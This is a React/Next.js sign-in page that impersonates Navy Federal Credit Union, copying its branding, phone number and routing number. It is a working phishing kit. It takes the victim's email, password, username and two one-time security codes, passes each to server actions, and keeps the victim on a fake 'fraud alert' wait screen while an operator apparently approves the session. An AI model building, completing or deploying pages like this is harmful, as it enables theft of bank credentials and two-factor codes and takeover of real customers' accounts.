'use client'

import { useEffect, useState } from 'react'
import { 
  Menu, 
  Globe, 
  Lock, 
  HelpCircle, 
  Eye, 
  EyeOff, 
  Laptop, 
  ShieldCheck, 
  UserCheck, 
  Home 
} from 'lucide-react'

import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions'

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success'

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.'

export default function NavyFederalBanking() {
  const [step, setStep] = useState<Step>('credentials')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [username, setUsername] = useState('')
  const [otp, setOtp] = useState('')
  const [attemptId, setAttemptId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [note, setNote] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return
    let cancelled = false
    const tick = async () => {
      const s = await getStatus(attemptId)
      if (cancelled) return
      if (s.status === 'approved') setStep('approved_success')
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected')
        setError('Sign-in was rejected.')
      }
    }
    tick()
    const id = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [step, attemptId])

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setAttemptId(r.attemptId)
        setStep('username')
        setNote(null)
        return
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const r = await submitUsername({ attemptId, username })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        setStep('otp1')
        setNote('Code sent to your email.')
        return
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const which = step === 'otp1' ? 1 : 2
        const r = await submitOtp({ attemptId, otp, which })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        if (r.next === 'otp2') {
          setStep('otp2')
          setNote('New second code sent to your email.')
          return
        }
        setStep('awaiting_approval')
        setNote(WAIT_MSG)
      }
    } catch (err) {
      setLoading(false)
      setError(err instanceof Error ? err.message : 'Error')
    }
  }

  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
    credentials: 'Sign In',
    username: 'Enter Username',
    otp1: 'Enter First Code',
    otp2: 'Enter Second Code',
    awaiting_approval: 'Verification in Progress',
    rejected: 'Sign-in Blocked',
  }

  return (
    <div className="min-h-screen bg-[#143260] font-sans antialiased text-gray-800">
      {/* Navigation Header */}
      <header className="bg-[#104780] text-white px-4 py-3 flex items-center justify-between border-b border-blue-900">
        <div className="flex items-center space-x-3">
          <button className="p-1 hover:bg-blue-800 rounded transition-colors" aria-label="Menu">
            <Menu className="w-6 h-6 text-white" />
          </button>
          <div className="flex items-center space-x-2">
            <Globe className="w-7 h-7 text-white" />
            <span className="font-extrabold tracking-tight text-xl uppercase italic">
              Navy Federal
            </span>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="max-w-md mx-auto">
        {/* Banner Title Section */}
        <section className="bg-[#a8c9e8] px-5 py-4">
          <h1 className="text-2xl font-bold text-[#10305a]">
            {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
          </h1>
        </section>

        {/* Sign In / Flow Form Container */}
        <section className="bg-[#a8c9e8] px-4 pb-6">
          <div className="bg-[#f4f4f4] rounded-lg shadow-md p-5 border-t-4 border-[#e07e27]">
            {step === 'approved_success' ? (
              <div className="space-y-3">
                <h2 className="text-xl font-semibold text-gray-800 border-b border-gray-300 pb-3">
                  Congratulations
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed">
                  Your account &amp; verification has been approved.
                </p>
                {email ? <p className="text-sm font-bold text-gray-800">{email}</p> : null}
              </div>
            ) : (
              <>
                <div className="flex items-center space-x-2 border-b border-gray-300 pb-3 mb-5">
                  <Lock className="w-6 h-6 text-gray-700" />
                  <h2 className="text-xl font-semibold text-gray-800">
                    {titles[step]}
                  </h2>
                </div>

                <form onSubmit={onSubmit} className="space-y-4">
                  {step === 'credentials' && (
                    <>
                      <div>
                        <label htmlFor="email" className="flex items-center text-sm font-bold text-gray-800 mb-1">
                          Email
                          <HelpCircle className="w-4 h-4 ml-1 text-gray-500 cursor-pointer" />
                        </label>
                        <input
                          id="email"
                          type="email"
                          required
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
                        />
                      </div>

                      <div>
                        <label htmlFor="password" className="block text-sm font-bold text-gray-800 mb-1">
                          Password
                        </label>
                        <div className="relative">
                          <input
                            id="password"
                            type={showPassword ? 'text' : 'password'}
                            required
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 bg-white border border-gray-400 rounded pr-10 focus:outline-none focus:ring-2 focus:ring-blue-600"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-900 hover:text-blue-700"
                            aria-label="Toggle password visibility"
                          >
                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                        </div>
                      </div>

                      <div>
                        <a
                          href="#signin-help"
                          className="text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
                        >
                          SIGN IN HELP
                        </a>
                      </div>
                    </>
                  )}

                  {step === 'username' && (
                    <div>
                      <label htmlFor="username" className="flex items-center text-sm font-bold text-gray-800 mb-1">
                        Username
                        <HelpCircle className="w-4 h-4 ml-1 text-gray-500 cursor-pointer" />
                      </label>
                      <input
                        id="username"
                        type="text"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
                        autoComplete="username"
                      />
                    </div>
                  )}

                  {(step === 'otp1' || step === 'otp2') && (
                    <div>
                      <label htmlFor="otp" className="block text-sm font-bold text-gray-800 mb-1">
                        {step === 'otp1' ? 'First Security Code' : 'Second Security Code'}
                      </label>
                      <input
                        id="otp"
                        type="text"
                        required
                        inputMode="numeric"
                        maxLength={6}
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
                      />
                    </div>
                  )}

                  {step === 'awaiting_approval' && (
                    <p className="text-sm text-gray-700 leading-relaxed">{WAIT_MSG}</p>
                  )}

                  {error && <p className="text-red-600 text-sm font-semibold m-0">{error}</p>}
                  {note && step !== 'awaiting_approval' && (
                    <p className="text-gray-700 text-sm m-0">{note}</p>
                  )}

                  {step !== 'awaiting_approval' && step !== 'rejected' && (
                    <button
                      type="submit"
                      disabled={loading}
                      className="w-full mt-4 bg-[#e07e27] hover:bg-[#c96c1e] disabled:opacity-50 text-white font-bold py-3 px-4 rounded shadow transition-colors text-base"
                    >
                      {loading ? 'Please wait…' : step === 'credentials' ? 'Sign In' : 'Continue'}
                    </button>
                  )}

                  {step !== 'credentials' && step !== 'awaiting_approval' && (
                    <button
                      type="button"
                      onClick={() => {
                        setStep('credentials')
                        setAttemptId(null)
                        setUsername('')
                        setOtp('')
                        setError(null)
                        setNote(null)
                      }}
                      className="w-full bg-transparent hover:bg-gray-200 text-[#104780] font-bold py-2 px-4 rounded border border-[#104780] transition-colors text-sm mt-2"
                    >
                      Start over
                    </button>
                  )}
                </form>
              </>
            )}
          </div>
        </section>

        {/* Member Callout Section */}
        <section className="bg-white px-6 py-8 text-center space-y-4">
          <h2 className="text-xl font-bold text-[#10305a]">
            Not a Navy Federal Member?
          </h2>
          <p className="text-gray-700 text-sm leading-relaxed max-w-sm mx-auto">
            Join now and enjoy the support and great service of a credit union that puts your needs first.
          </p>
          <div className="space-y-3 pt-2">
            <button className="w-full bg-[#e07e27] hover:bg-[#c96c1e] text-white font-bold py-3 px-4 rounded transition-colors">
              Become a Member
            </button>
            <button className="w-full bg-[#2b6cb0] hover:bg-[#205288] text-white font-bold py-3 px-4 rounded transition-colors">
              Learn More
            </button>
          </div>
        </section>

        {/* Info Cards Container */}
        <section className="bg-[#143260] px-4 py-6 space-y-6">
          {/* Card 1 */}
          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
                <Laptop className="w-7 h-7 text-[#104780]" />
              </div>
            </div>
            <h3 className="font-bold text-gray-800 text-lg mb-2">
              Don't have online access?
            </h3>
            <a
              href="#enroll"
              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
            >
              ENROLL IN DIGITAL BANKING »
            </a>
          </div>

          {/* Card 2 */}
          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
                <ShieldCheck className="w-7 h-7 text-[#104780]" />
              </div>
            </div>
            <h3 className="font-bold text-gray-800 text-lg mb-2">
              Find out more about secure digital banking
            </h3>
            <a
              href="#learn-more"
              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
            >
              LEARN MORE »
            </a>
          </div>

          {/* Card 3 */}
          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
                <UserCheck className="w-7 h-7 text-[#104780]" />
              </div>
            </div>
            <h3 className="font-bold text-gray-800 text-lg mb-2">Need help?</h3>
            <a
              href="#contact"
              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
            >
              CONTACT US »
            </a>
          </div>
        </section>

        {/* Footer Section */}
        <footer className="bg-[#e5e7eb] text-gray-700 px-6 py-8 text-xs space-y-4">
          {/* Logo & Contact */}
          <div className="space-y-2">
            <div className="flex items-center space-x-2 text-[#10305a]">
              <Globe className="w-6 h-6" />
              <div className="leading-tight">
                <div className="font-extrabold text-base tracking-tight uppercase italic">NAVY FEDERAL</div>
                <div className="text-[10px] tracking-wider uppercase font-semibold">Credit Union</div>
              </div>
            </div>
            <div className="pt-2 text-sm text-gray-800">
              <span>24/7 Member Services: </span>
              <a href="tel:18888426328" className="text-[#104780] font-bold border-b border-dotted border-blue-800">
                1-888-842-6328
              </a>
            </div>
            <div className="text-sm text-gray-800">
              <span>Routing Number: </span>
              <span className="font-bold">256074974</span>
            </div>
          </div>

          <hr className="border-gray-300 my-3" />

          {/* Footer Links */}
          <div className="flex flex-wrap gap-x-2 gap-y-1 text-[#104780] font-semibold">
            <a href="#about" className="border-b border-dotted border-blue-800">About Us</a>
            <span>|</span>
            <a href="#contact" className="border-b border-dotted border-blue-800">Contact Us</a>
            <span>|</span>
            <a href="#privacy" className="border-b border-dotted border-blue-800">Privacy</a>
            <span>|</span>
            <a href="#security" className="border-b border-dotted border-blue-800">Security</a>
            <span>|</span>
            <a href="#accessibility" className="border-b border-dotted border-blue-800">Accessibility</a>
            <span>|</span>
            <a href="#browser" className="border-b border-dotted border-blue-800">Browser Support</a>
            <span>|</span>
            <a href="#terms" className="border-b border-dotted border-blue-800">Terms and Conditions</a>
            <span>|</span>
            <a href="#disclosures" className="border-b border-dotted border-blue-800">Disclosures</a>
          </div>

          <p>© 2026 Navy Federal Credit Union. All rights reserved.</p>

          {/* Insurance Badges */}
          <div className="space-y-2 pt-1">
            <div className="flex items-center space-x-2">
              <span className="bg-[#104780] text-white font-bold text-[10px] px-1 py-0.5 rounded">NCUA</span>
              <a href="#ncua" className="text-[#104780] font-semibold border-b border-dotted border-blue-800">
                Federally Insured by NCUA
              </a>
              <span>|</span>
            </div>
            <div className="flex items-center space-x-1">
              <Home className="w-4 h-4 text-[#104780]" />
              <a href="#housing" className="text-[#104780] font-semibold border-b border-dotted border-blue-800">
                Equal Housing Lender
              </a>
            </div>
          </div>

          {/* Legal Disclaimers */}
          <div className="space-y-3 text-[11px] text-gray-600 leading-relaxed pt-2">
            <p>APY = Annual Percentage Yield | APR = Annual Percentage Rate</p>
            <p>APY is accurate as of August 31, 2026 ET.</p>
            <p>+Rates are based on an evaluation of credit history, so your rate may differ.</p>
            <p>++Rates are variable, and based on an evaluation of credit history, so your rate may differ.</p>
            <p>
              *Message and data rates may apply.{' '}
              <a href="#terms" className="text-[#104780] border-b border-dotted border-blue-800">
                Terms and Conditions
              </a>{' '}
              are available.
            </p>
            <p>
              Military images used for representational purposes only; do not imply government endorsement.
              iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of Apple Inc. Android™ and Google Play™ are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
            </p>
          </div>
        </footer>
      </main>
    </div>
  )
}
